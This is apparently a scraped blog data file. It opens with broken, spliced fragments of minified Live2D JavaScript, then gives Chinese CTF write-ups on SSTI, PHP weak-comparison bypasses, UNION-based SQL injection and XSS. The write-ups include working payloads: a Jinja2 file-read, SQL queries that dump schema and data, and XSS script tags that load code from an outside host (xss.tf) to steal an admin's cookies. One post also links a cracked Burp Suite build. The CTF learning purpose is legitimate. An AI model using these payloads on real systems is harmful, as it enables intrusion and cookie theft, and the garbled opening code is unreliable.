$(){this.lastTime=0,this.lastModel=null,this.partsGroups=new Array}function u(t){this.paramIndex=-1,this.partsIndex=-1,this.link=null,this.id=t}function p(){this.EPSILON=.01,this.faceTargetX=0,this.faceTargetY=0,this.faceX=0,this.faceY=0,this.faceVX=0,this.faceVY=0,this.lastTimeSec=0}function f(){_.prototype.constructor.call(this),this.screenLeft=null,this.screenRight=null,this.screenTop=null,this.screenBottom=null,this.maxLeft=null,this.maxRight=null,this.maxTop=null,this.maxBottom=null,this.max=Number.MAX_VALUE,this.min=0}function c(){}var d=0;r.prototype.getModelMatrix=function(){return this.modelMatrix},r.prototype.setAlpha=function(t){t>.999&&(t=1),ts&&(s=l),$a&&(a=$)}var u=this.modelMatrix.invertTransformX(e),p=this.modelMatrix.invertTransformY(i);return n=1&&(this.eyeState=g.STATE_OPENING,this.stateStartTime=i),e=0;break;case g.STATE_OPENING:(r=(i-this.stateStartTime)/this.openingMotionMsec)>=1&&(r=1,this.eyeState=g.STATE_INTERVAL,this.nextBlinkTime=this.calcNextBlink()),e=r;break;case g.STATE_INTERVAL:this.nextBlinkTime=t||this.currentPriority>=t||(this.reservePriority=t,0))},h.prototype.setReservePriority=function(t){this.reservePriority=t},h.prototype.updateParam=function(t){var e=MotionQueueManager.prototype.updateParam.call(this,t);return this.isFinished()&&(this.currentPriority=0),e},h.prototype.startMotionPrio=function(t,e){return e==this.reservePriority&&(this.reservePriority=0),this.currentPriority=e,this.startMotion(t,!1)},l.load=function(t){for(var e=new l,i=c.getPlatformManager().jsonParseFromBytes(t).physics_hair,r=i.length,o=0;o=0)break;r=n,o=t.getPartsOpacity(s),(o+=i/.5)>1&&(o=1)}}r$&&(this.faceVX*=$/u,this.faceVY*=$/u),this.faceX+=this.faceVX,this.faceY+=this.faceVY}}else this.lastTimeSec=UtSystem.getUserTimeMSec()},(f.prototype=new _).getMaxScale=function(){return this.max},f.prototype.getMinScale=function(){return this.min},f.prototype.setMaxScale=function(t){this.max=t},f.prototype.setMinScale=function(t){this.min=t},f.prototype.isMaxScale=function(){return this.getScaleX()==this.max},f.prototype.isMinScale=function(){return this.getScaleX()==this.min},f.prototype.adjustTranslate=function(t,e){this.tr[0]*this.maxLeft+(this.tr[12]+t)>this.screenLeft&&(t=this.screenLeft-this.tr[0]*this.maxLeft-this.tr[12]),this.tr[0]*this.maxRight+(this.tr[12]+t)this.max&&this.tr[0]>0&&(i=this.max/this.tr[0]);var o=[1,0,0,0,0,1,0,0,0,0,1,0,t,e,0,1],n=[i,0,0,0,0,i,0,0,0,0,1,0,0,0,0,1],s=[1,0,0,0,0,1,0,0,0,0,1,0,-t,-e,0,1];_.mul(s,this.tr,this.tr),_.mul(n,this.tr,this.tr),_.mul(o,this.tr,this.tr)},f.prototype.setScreenRect=function(t,e,i,r){this.screenLeft=t,this.screenRight=e,this.screenTop=r,this.screenBottom=i},f.prototype.setMaxScreenRect=function(t,e,i,r){this.maxLeft=t,this.maxRight=e,this.maxTop=r,this.maxBottom=i},f.prototype.getScreenLeft=function(){return this.screenLeft},f.prototype.getScreenRight=function(){return this.screenRight},f.prototype.getScreenBottom=function(){return this.screenBottom},f.prototype.getScreenTop=function(){return this.screenTop},f.prototype.getMaxLeft=function(){return this.maxLeft},f.prototype.getMaxRight=function(){return this.maxRight},f.prototype.getMaxBottom=function(){return this.maxBottom},f.prototype.getMaxTop=function(){return this.maxTop},c.platformManager=null,c.getPlatformManager=function(){return c.platformManager},c.setPlatformManager=function(t){c.platformManager=t},t.exports={L2DTargetPoint:p,Live2DFramework:c,L2DViewMatrix:f,L2DPose:$,L2DPartsParam:u,L2DPhysics:l,L2DMotionManager:h,L2DModelMatrix:a,L2DMatrix44:_,EYE_STATE:g,L2DEyeBlink:s,L2DExpressionParam:n,L2DExpressionMotion:o,L2DBaseModel:r}},function(t,e,i){\"use strict\";var r={DEBUG_LOG:!1,DEBUG_MOUSE_LOG:!1,DEBUG_DRAW_HIT_AREA:!1,DEBUG_DRAW_ALPHA_MODEL:!1,VIEW_MAX_SCALE:2,VIEW_MIN_SCALE:.8,VIEW_LOGICAL_LEFT:-1,VIEW_LOGICAL_RIGHT:1,VIEW_LOGICAL_MAX_LEFT:-2,VIEW_LOGICAL_MAX_RIGHT:2,VIEW_LOGICAL_MAX_BOTTOM:-2,VIEW_LOGICAL_MAX_TOP:2,PRIORITY_NONE:0,PRIORITY_IDLE:1,PRIORITY_SLEEPY:2,PRIORITY_NORMAL:3,PRIORITY_FORCE:4,MOTION_GROUP_IDLE:\"idle\",MOTION_GROUP_SLEEPY:\"sleepy\",MOTION_GROUP_TAP_BODY:\"tap_body\",MOTION_GROUP_FLICK_HEAD:\"flick_head\",MOTION_GROUP_PINCH_IN:\"pinch_in\",MOTION_GROUP_PINCH_OUT:\"pinch_out\",MOTION_GROUP_SHAKE:\"shake\",MOTION_GROUP_Talk:\"talk\",MOTION_GROUP_Reset:\"rest\",HIT_AREA_HEAD:\"head\",HIT_AREA_BODY:\"body\",hitFlag:!1};t.exports=r},function(t,e,i){\"use strict\";Object.defineProperty(e,\"__esModule\",{value:!0}),e.setContext=function(t){r=t},e.getContext=function(){return r};var r=void 0},function(t,e,i){\"use strict\";function r(){}r.matrixStack=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],r.depth=0,r.currentMatrix=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],r.tmp=new Array(16),r.reset=function(){this.depth=0},r.loadIdentity=function(){for(var t=0;t"}],"posts":[{"title":"Success","slug":"Success","date":"2019-04-12T14:10:11.000Z","updated":"2019-04-12T14:12:45.689Z","comments":true,"path":"2019/04/12/Success/","link":"","permalink":"https://kkkiona.github.io/2019/04/12/Success/","excerpt":"","text":"1000分纪念一下。","categories":[],"tags":[]},{"title":"随笔-19-04-12","slug":"随笔-19-04-12","date":"2019-04-12T10:12:15.000Z","updated":"2019-04-12T10:13:22.312Z","comments":true,"path":"2019/04/12/随笔-19-04-12/","link":"","permalink":"https://kkkiona.github.io/2019/04/12/随笔-19-04-12/","excerpt":"","text":"停了一天电，刚才发文的时候发现图床又炸了，准备用hexo的静态关联了。一会修复图片问题。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"SSTI服务端模板注入","slug":"SSTI服务端模板注入","date":"2019-04-12T09:58:35.000Z","updated":"2019-04-12T10:01:14.533Z","comments":true,"path":"2019/04/12/SSTI服务端模板注入/","link":"","permalink":"https://kkkiona.github.io/2019/04/12/SSTI服务端模板注入/","excerpt":"题目：Confusion 1**这道题目名字就叫 “困惑”，乍一看确实让人困惑，整个界面就是一张图片还有两个跳转，两个跳转还都是404。","text":"题目：Confusion 1**这道题目名字就叫 “困惑”，乍一看确实让人困惑，整个界面就是一张图片还有两个跳转，两个跳转还都是404。但其实有不是那么困惑，因为题目里写了QCTF2018。。。 以下是我整个解这道题的完整过程，由于题目说明里面提示图片很关键，我首先查看的是图片，我知道Python是蛇的意思，所以我认为这道题必然牵扯Python。F12看到似乎没啥特别，下载下来看一下，因为我知道有些线索可能写在了图片属性里面，或者图片加密。似乎并无异样。用binwalk跑了一下也没有发现结果。由于知识有限并不清楚还有什么其它图片利用方法，于是我决定先把眼光转向其它线索，题目还提示要找到input的地方。我观察了一下主页面的HTML代码发现并没有被设置为“hidden”的隐藏input标签。 然而在检查login.php的404的时候发现代码里有线索。看来这个文件里面应该是有我们需要的flag。![在这里插入图片描述](https://img-blog.csdnimg.cn/20190412002146350.png并访问不了。我猜测这个404页面可能做了伪装，虽然题目说了“Scanner is useless”。但是我还是决定用kali扫一下。当然结果肯定是没有什么有用的发现。（我的kali在U盘上，用的是live模式不好截图就不放出来了）。 我猜测会不会这个页面隐藏了GET参数，可以用来登录之类的。我尝试给比较常见的变量名“user”传递一个值看看有什么反应。没什么反应。感觉有点手足无措，想到之前已经做过XSS和SQL注入的题了，应该不会用XSS来做，但是我决定还是试一下。输入 1&lt;script&gt;alert(1)&lt;/script&gt; 出乎意料的竟然执行了。尝试 123456&lt;script&gt;Var fso=new ActiveXObject(Scripting.FileSystemObject); Var f=fso.opentextfile(“http://example.com/opt/flag_example.txt”,1，true); s = f.ReadAll(); document.write(s);&lt;/script&gt; 可以看到网站非常“委婉”的提示我们不要这么做。不过也就是说这么做也可以但是这里不提倡，之前做XSS的时候我就浏览过一些如何绕过这种弹窗保护机制，我觉得应该有可行之处，但是我还是希望能够按照正规步骤做题。 最终限于知识贫乏我只能去搜一下QCTF的内容。竟然在里面发现了原题！！ 把源码粘上去发现，好了本文结束，这道题目具体做法就是搜一搜。 ~~那是不可能的。既然找到正确答案了我们就必须知其所以然。 首先我们一开始的工作方向是正确的，我们已经找到了input点。但是这里用到了一个之前没有用过的注入技术。SSTI服务端门模板注入。 SSTI网上的资料并不多，我查阅了自己的一些书籍，只在专门的web安全书籍（黑客攻防技术宝典（web篇））里面才有相关介绍，可能我查阅不够仔细这个内容在其它书里面只是涵盖在了某个专题里面。 SSTI是针对模板进行攻击的。来看一个PHP模板的例子。 什么是模板，为什么要使用模板？ 模板简单来说就是定义了一个通用的框架，但是框架里面的内容是动态解析的。比如 123&lt;html&gt;&lt;title&gt;&#123;%$cont%&#125;&lt;/title&gt;&lt;/html&gt; 我们定义了一个HTML框架里面包含一个title标签但是至于标签里面是什么，现在不知道。 至于这个cont什么时候去填充，有两种。前端渲染，后端渲染。 前端渲染就是服务器一股脑把信息给浏览器，浏览器对信息先解析成HTML代码在渲染。 后端渲染是服务端把信息解析好了直接发给浏览器，浏览器仅进行渲染工作。 譬如说我们上边的模板页面起名为“index.html”。后端执行 1$temp-&gt;display(&apos;index.html&apos;, array(&apos;cont&apos; =&gt; $_GET[&apos;title&apos;])); 这样页面的就变成“title”的值，比如是123，那么 123&lt;html&gt;&lt;title&gt;123&lt;/title&gt;&lt;/html&gt; 这令我想到了之前学习的织梦CMS。很显然，凡事用到用户输入的如果不加以处理必然会造成类似XSS的漏洞。题目来看的话这里必然存在后端渲染的漏洞。测试一下，输入 1&#123;&#123;7*7&#125;&#125; 前端显示49，这是因为服务端把7*7进行了运算，像PHP的Twig模板不仅可以进行表达式运算还能输出变量的值，也可以用注释符的办法看看能不能输出注释内容来判断是否存在漏洞。由此来看模板漏洞也是因为么有对用户输入过滤引起的。 不过看了答案之后还是省了很多步骤，比如那张图片暗示了Python，这里的404页面其实不是Apache+PHP的构架，也就是说这里使用的并不是PHP 诸如Twig的模板，而是Python Flask jinja2。 这样我们只需要了解Flask jinja2的用法就可以找到植入payload的方法。官文 http://docs.jinkan.org/docs/jinja2/ （其实不用看也可以因为只用到基本语法可以搜一下） 构造payload。构造payload使用到了Python的内建属性 官文 https://docs.python.org/2/library/stdtypes.html#file-objects由于我的Python还在起步阶段，在参考了大量资料后还是不能完全对这个payload进行最正确的解释（从做题到写文已经一天半了一直在看这个payload），这里给出我认为比较全的一个解释 转载 https://www.freebuf.com/articles/web/98928.html简单说一下我的理解就是我们需要用一个类型变量比如说一个空字符串，使用class来获取它的类型，并通过mro来获取对象的继承类。然后通过索引获取我们目标对象，再用subclass列出所有类，通过索引找到“file”类，有了“file”对象后就能使用read()来读取文件了。 所以payload代码是 1&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/flag.txt&apos;).read() &#125;&#125; 获得flag。 不过QCTF的答案还说到了过滤，虽然这道题目没有用到，但是说一下。 比如题目对class做了过滤的话，可以使用request.args来绕过。这个东西是flask模板里面用于获取GET参数的一个功能，所以我们可以吧class定义为字符串变量通过request.args来获取这样就绕过了过滤。 1&#123;&#123;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/flag.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 这个思想类似于之前XSS使用的截取字符串构造 script 的思想。","categories":[],"tags":[]},{"title":"随笔-19-4-11","slug":"随笔-19-4-11","date":"2019-04-11T12:56:59.000Z","updated":"2019-04-11T13:02:53.179Z","comments":true,"path":"2019/04/11/随笔-19-4-11/","link":"","permalink":"https://kkkiona.github.io/2019/04/11/随笔-19-4-11/","excerpt":"","text":"今天连肝两道高分大题，第三道题刚好处于关键时期，如果做出来时间太晚了的话，就一早再发具体做法，先大致说一下。 第一道题 confusion 1 图片的意思是Python VS PHP 在任何一个404页面里面能看到备注提示 flag在哪。通过SSTI 可以解出来，注意伪装成PHP的Python。第二题 basicFIleinclude 通过伪造php协议可以读出来 flag.php的源码","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"PHP 漏洞","slug":"PHP-漏洞","date":"2019-04-10T09:39:02.000Z","updated":"2019-04-10T09:51:03.780Z","comments":true,"path":"2019/04/10/PHP-漏洞/","link":"","permalink":"https://kkkiona.github.io/2019/04/10/PHP-漏洞/","excerpt":"今天做了两道PHP漏洞利用的题目相比XSS和SQL简单不少。直接上题目。 题目一","text":"今天做了两道PHP漏洞利用的题目相比XSS和SQL简单不少。直接上题目。 题目一 意思很简单我们需要提交一个name变量一个password变量和一个test变量，用GET方式传输，并且test的MD5编码要等于’0’，name！=password，且name和password的SHA1是一样的。 第一个要求MD5=’0’的字符串，如果你想利用之前获取验证码的方法用代码去跑一个MD5等于’0’字符串是不可能的。这里就需要用到PHP的弱匹配特性。 ！=和==在php中属于弱匹配，它会先进行数据类型转换在进行匹配。而===的话呢就不会转换数据类型，类型不相等就直接false了。 利用数据转换这一特点，根据PHP手册的描述：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。其中0e是科学计数法，因为涉及到数字内容，所以就会转换为数值，而0e830400451993494058024219903391转换为数值也就是0*(10^830400451993494058024219903391) = 0，因此只需找到生成的MD5值类似0exxxxxxxxx的字符串即可。，如123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 这些都是以’0E’开头的字符串。我们输入以下语句在URL里面1http://example.com/index.php?name=a&amp;password=b&amp;test=QNKCDZO 第一关搞定。 那么怎么实现name！=password但是两者的SHA1值又一样呢，SHA1相同的两个数据是存在的，但是想通过穷举的方式来找十分困难，所以目标变放在了sha1()，这个函数上。构造name！=password很简单。对于php的sha1()函数如果加密成功则返回加密后的字符串，反之返回NULL。那我们就想到能不能通过让两者都返回NULL就可以了，因为判断语句里面并没有检查返回结果是否为NULL。经过查询，sha1()不支持处理数组，那么我们只需要把name和password设置为数组就可以绕过了。1http://example.com/index.php?name[]=a&amp;password[]=b&amp;test=QNKCDZO 第二题 第二题要求在config.php里面写入脚本，其实只要把过滤字符 ‘&lt;’ , ‘php’ 写进去就行。 可以看到脚本使用stripos()方法对 ‘&lt;’ , ‘php’ 字符进行了过滤处理。按照之前做XSS的方法我想到可不可以使用转码的方式绕过检测，输入1&amp;lt 可以字符直接显示了出来，php直接把它处理成了纯文本放到了body里面，此法不通。 试着查阅stripos()的相关漏洞，发现多数都是使用了此方法返回的是字符串所在位置，是一个int型，如果恰好返回0也就是非法字符位于开头，就可以破坏诸如 !stripos()的判断方式。但是题目里面直接使用了is_int()进行判断，所以无法使用此方法。 其实，我在思考这道题目的时候有点绕弯路了，费了一番周折之后我才想到可以同第一题一样让stripos()返回一个错误。经查阅stripos()也无法处理数组且返回NULL。那话不多说直接1http://example.com/index.php?content[]=&lt;","categories":[],"tags":[]},{"title":"SQL 注入（UNION联合注入）","slug":"SQL-注入（UNION联合注入）","date":"2019-04-09T15:44:23.000Z","updated":"2019-04-10T09:49:48.783Z","comments":true,"path":"2019/04/09/SQL-注入（UNION联合注入）/","link":"","permalink":"https://kkkiona.github.io/2019/04/09/SQL-注入（UNION联合注入）/","excerpt":"SQL注入原理上跟XSS接近，也是因为对用户的输入信息不做检查而导致的漏洞。比如有一个登录页面它不加检查的把用户输入信息放到SQL语句中。1SELECT * FROM users WHERE username = &apos;用户输入信息&apos; AND password = &apos;&apos;用户输入信息&apos; 如果我们输入的信息是 “admin’ –”1SELECT * FROM users WHERE username = &apos;admin&apos; -- AND password = &apos;&apos;用户输入信息&apos; 可以看到由于 ‘ 闭合了用户名称的查询使得 – 逃出，从而注释掉了 password的检查。成功使得admin账户登录。 由于SQL注入的方式有很多，这道题目我选择了UNION联合注入方式。","text":"SQL注入原理上跟XSS接近，也是因为对用户的输入信息不做检查而导致的漏洞。比如有一个登录页面它不加检查的把用户输入信息放到SQL语句中。1SELECT * FROM users WHERE username = &apos;用户输入信息&apos; AND password = &apos;&apos;用户输入信息&apos; 如果我们输入的信息是 “admin’ –”1SELECT * FROM users WHERE username = &apos;admin&apos; -- AND password = &apos;&apos;用户输入信息&apos; 可以看到由于 ‘ 闭合了用户名称的查询使得 – 逃出，从而注释掉了 password的检查。成功使得admin账户登录。 由于SQL注入的方式有很多，这道题目我选择了UNION联合注入方式。题目目标页面是一个新闻页面，可以通过搜索栏查询新闻。 首先查看有无注入点，输入1&apos; 点击确定发现页面报错，说明存在注入点，写入的’影响了SQL语句的执行。 输入1&apos; -- 报错，输入1&apos; # 正常，可能页面设置了WAF把“–”字符屏蔽了，但是“#”注释可以使用，输入11&apos; OR 1=1 # 正常显示出所有新闻，1=1的结果恒成立，加上OR逻辑运算相当于对所有数据进行访问。继续输入11&apos; ORDER BY 1 # 没有报错，更改 ORDER BY 的数字，到4的时候报错，说明有3列。ORDER BY 是访问的数据按照第几列排序的意思，输入4的时候出错可见表格只有3列。列数可能比较多的时候推荐用二分法。 知道了有几列就可以使用UNION联合查询语句了。 UNION可以把两个查询语句的结果放在一起输出，比如1SELECT name,sex FROM user UNION SELECT month,day FROM date 显示结果是12张三 男2月 3日 之所以要获取表单列数，是因为UNION的使用前提是多次查询的列数必须保持一致，否则会报错。 由于我们不知道每一列的数据类型，因此我们可以使用可以随意转换类型的NULL类型来试探。1&apos; UNION SELECT NULL,NULL,NULL # 没问题，再试试1&apos; UNION SELECT &apos;a&apos;,NULL,NULL # 也没问题，看一下你的数据有没有在什么地方显示出来，如果没有继续试探。1&apos; UNION SELECT NULL,NULL,&apos;a&apos; # 试探到第三例的时候，发现查找内容显示在了页面内。那么就可以用这一位作我们的显示位，来查询的各种信息了。逐行输入下面的代码。1234567891011121314151617181920212223&apos; UNION SELECT NULL,NULL,@@version # // 数据库版本 &apos; UNION SELECT NULL,NULL,user() # // 用户信息&apos; UNION SELECT NULL,NULL,session_user()# // 当前用户&apos; UNION SELECT NULL,NULL,database()# // 数据库名称&apos; UNION SELECT NULL,NULL,@@datadir# /数据库路径&apos; UNION SELECT NULL,NULL,@@basedir# //数据库安装路径&apos; UNION SELECT NULL,NULL,@@version_compile_os# //操作系统// 使用group_concat()一次性显示： &apos; UNION SELECT NULL,NULL,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA # //获取所有数据库&apos; UNION SELECT NULL,NULL, (select group_concat(table_name) from information_schema.tables where table_schema=&apos;&apos;数据库名) # //数据库全部表名&apos; UNION SELECT NULL,NULL, (select group_concat(column_name) from information_schema.columns where table_schema=&apos;数据库名&apos; and table_name=&apos;表名&apos;) # //表的全部列名&apos; UNION SELECT NULL,NULL,列名 from 表名 # // 根据上面获取的 表名、列名查找信息 最终通过对获取的数据成功找到flag。","categories":[],"tags":[]},{"title":"XSS 题目解析（上篇）","slug":"XSS 题目解析（上篇）","date":"2019-04-09T06:50:56.332Z","updated":"2019-04-09T07:43:16.842Z","comments":true,"path":"2019/04/09/XSS 题目解析（上篇）/","link":"","permalink":"https://kkkiona.github.io/2019/04/09/XSS 题目解析（上篇）/","excerpt":"在开始解题之前先说一下什么是Proof Of Work，一会会用到。Proof Of Work 简称POW中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。 12345678910from itertools import countimport hashlibdef md5(s): return hashlib.md5(s.encode()).hexdigest()for i in count(100000): if md5(str(i)).startswith(&apos;49ab02&apos;): print(i) break 使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。 知道了怎么获取这个验证码现在开始解题。 第一题：Baby XSS 根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下","text":"在开始解题之前先说一下什么是Proof Of Work，一会会用到。Proof Of Work 简称POW中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。 12345678910from itertools import countimport hashlibdef md5(s): return hashlib.md5(s.encode()).hexdigest()for i in count(100000): if md5(str(i)).startswith(&apos;49ab02&apos;): print(i) break 使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。 知道了怎么获取这个验证码现在开始解题。 第一题：Baby XSS 根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下果然不行，提示你不是admin。那么既然如此我们就需要获取admin的身份。由此想到获取admin的cookies然后通过Burp Suite工具修改登录时的cookies就可以了。 现在问题变成了获取cookies。题目给出了给admin发送message的文本框，自然就想到用XSS获取cookies。 先试探一下目标有没有设置过滤机制。 1&lt;script&gt;alert(1)&lt;/script&gt; 发送成功，我们可以点Click me to view 看一下运行情况。看来代码被原样执行了，没有做过滤处理。 这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。http://xss.tf创建一个项目使用默认模块就可以。配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。 我们选择直接插入script标签的方式。 1&lt;sCrIpt srC=http://xss.tf/GCu&gt;&lt;/sCRipT&gt; 这里的不规则大小写是为了防止过滤掉script标签，本题经测试可以无视。将代码输入message消息框并提交。成功钓到了admin，展开后可以看到cookies。接下来就很简单了使用Burp Suite修改cookies就可以了。我给出一个永久破解版的Burp Suite但是这个版本不是很新，最高只能使用Java 8不过不用注册机破解，已经开启了scanner功能。打开前需要先把时间设置到2017年以前，开启后在恢复时间即可。链接：https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q 提取码：qun1 先在Proxy中的option里面添加一个代理地址和端口。然后把你的浏览器代理服务设置成这个地址端口即可。代理服务设置详见https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/ 开启intercept后，再点一下admin.php。把cookies改成刚才获取到的cookies再点forward。flag到手。 第二题：XSS 1 题目说xss.php比较脆弱，请通过URL给admin发送请求捕获admin的cookies，里面包含了flag。 先点开xss.php看一下。从给出的php代码中可以看出来对提交信息里面的” 、&lt;、&gt; 三个符号进行了过滤。先随便提交点东西试试。从提交情况来看，我们的代码放到了script标签里面并被定义成一个字符串变量。很容易想到用”符号构造闭合语句。 1&quot;;alert(1);// 如果这段代码可以成插入，那么script标签将会变成 1var a=&quot;&quot;;alert(1);//&apos;; 实验果然由于”被屏蔽无法构成闭合，而且被锁死的不只是”还有&lt;、&gt;没有这些字符将很难构造我们需要的代码。 看来直接写入明文是不可能的了，由此我们想到使用“暗文”来绕过php的检测。我们可以通过转码的方式来绕过检测。 可以通过使用Unicode编码来绕过php的检测，浏览器会自动解析Unicode编码把他转换为相应的字符。此方法需要明确提交的信息执行顺序是先经过php对提交内容进行原封不动的检测，再交给浏览器解析。 使用编码工具对上面的语句进行转码。把编码后的内容提交一下看看。OK，成功执行。那么接下来只需要植入Payload。对照你的XSS平台的使用说明，发现没有合适的使用方式，因为我们提交的内容在script标签里面，如果直接把我们的Payload写到script里面也不是不行但是过于庞大。也想到可不可以闭合script标签自己再重新构造标签，这个方法也是行不通的，我认为是因为在你的代码被解析之前，原本的script标签已经存在了所以不能闭合，而是会被解释成错误代码。可以看到灰色的script标签并没有被解析。所以我们可以使用createElement()方法来把script写到body里面。12345&quot;;var s=document.createElement(&apos;script&apos;);document.body.appendChild(s);s.src=&quot;http://xss.tf/Vw6&quot;;// 写入之后发现OK，执行，并且你的XSS平台也收到了提示。但是这里的信息是你本地的信息，因为提交者是你自己抓的包当然也是你的，我们需要通过URL的方式让admin来执行这个脚本。 回到题目页面把你编码后的代码放到示例URL后面提交后发现代码没了，经分析发现原来是Unicode的&amp;#阻断了传输，因为URL传输是有自己的编码的，那么我们就把代码转换成URL编码就可以了。注意是把Unicode编码好的再转一次转成encodeURIComponent编码。提交编码。flag在cookies里面。","categories":[],"tags":[]},{"title":"XSS 随笔 02","slug":"XSS 随笔 03","date":"2019-04-08T15:37:00.240Z","updated":"2019-04-08T15:44:24.693Z","comments":true,"path":"2019/04/08/XSS 随笔 03/","link":"","permalink":"https://kkkiona.github.io/2019/04/08/XSS 随笔 03/","excerpt":"","text":"这两天一直肝到两点多才睡觉，今天终于搞完了实在是坚持不了了，就先写这一篇XSS简介吧，具体的攻击步骤明天再发吧！","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"什么是 XSS","slug":"什么是XSS","date":"2019-04-08T15:34:10.787Z","updated":"2019-04-09T04:11:45.410Z","comments":true,"path":"2019/04/08/什么是XSS/","link":"","permalink":"https://kkkiona.github.io/2019/04/08/什么是XSS/","excerpt":"这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器的一种攻击。简单来说就是黑客通过探测可以植入数据的地方如URL，文本框等的漏洞，来注入恶意HTML代码从而获取像cookies等重要信息，甚至更严重的危害。这一点十分类似于SQL 注入，只不过这里注入的是HTML和JS。此外XSS最早的案例是跨域的，但时至今日跨域这一特点已不在重要，但是XSS这个名字却一直延续至今。即便XSS长期位居Web安全的头号大敌，但是由于XSS破坏性强，且产生的原因复杂，很难以一次性解决，所以现今复杂的网络应用环境滋生着大量的XSS漏洞。 XSS 分类 第一种：反射型 XSS 反射型XSS是最简单的类型，是指简单地把用户数据“反射”给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意练级，才能攻击成功。反射型 XSS也叫做 “非持久性 XSS” （Non-persistent XSS）。 1234567&lt;?php if(isset($_GET[&apos;name&apos;]))&#123; $text=$_GET[&apos;name&apos;]; echo &quot;&lt;div&gt;&quot;.$text.&quot;&lt;/div&gt;&quot; ; &#125; echo &apos;&lt;hr /&gt;&apos;; ?&gt; 这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。 1http://www.a.com/a.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt; 代码被执行了，用户cookies被打印出来。","text":"这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器的一种攻击。简单来说就是黑客通过探测可以植入数据的地方如URL，文本框等的漏洞，来注入恶意HTML代码从而获取像cookies等重要信息，甚至更严重的危害。这一点十分类似于SQL 注入，只不过这里注入的是HTML和JS。此外XSS最早的案例是跨域的，但时至今日跨域这一特点已不在重要，但是XSS这个名字却一直延续至今。即便XSS长期位居Web安全的头号大敌，但是由于XSS破坏性强，且产生的原因复杂，很难以一次性解决，所以现今复杂的网络应用环境滋生着大量的XSS漏洞。 XSS 分类 第一种：反射型 XSS 反射型XSS是最简单的类型，是指简单地把用户数据“反射”给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意练级，才能攻击成功。反射型 XSS也叫做 “非持久性 XSS” （Non-persistent XSS）。 1234567&lt;?php if(isset($_GET[&apos;name&apos;]))&#123; $text=$_GET[&apos;name&apos;]; echo &quot;&lt;div&gt;&quot;.$text.&quot;&lt;/div&gt;&quot; ; &#125; echo &apos;&lt;hr /&gt;&apos;; ?&gt; 这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。 1http://www.a.com/a.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt; 代码被执行了，用户cookies被打印出来。第二种：存储型 XSS 存储型 XSS 会把用户输入的数据“存储”在远端服务器。这种 XSS 具有很强的稳定性。上边的例子中可以看出用户点击恶意链接之后弹出cookies对话框，但是远端的黑客并不知道。如果编写一段代码可以把获取的cookies发送到黑客的服务器或者邮箱上，就可以窃取用户cookies了。但是这种代码比较庞大不适合写成临时文件，如放在URL中会使得URL过长可能导致意想不到的错误，因此需要把代码事先写好，存在服务器上通过各种方式在客户端运行此代码。这种代码称为 XSS Payload。 1&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://www.a.com/xss&apos;;&gt; 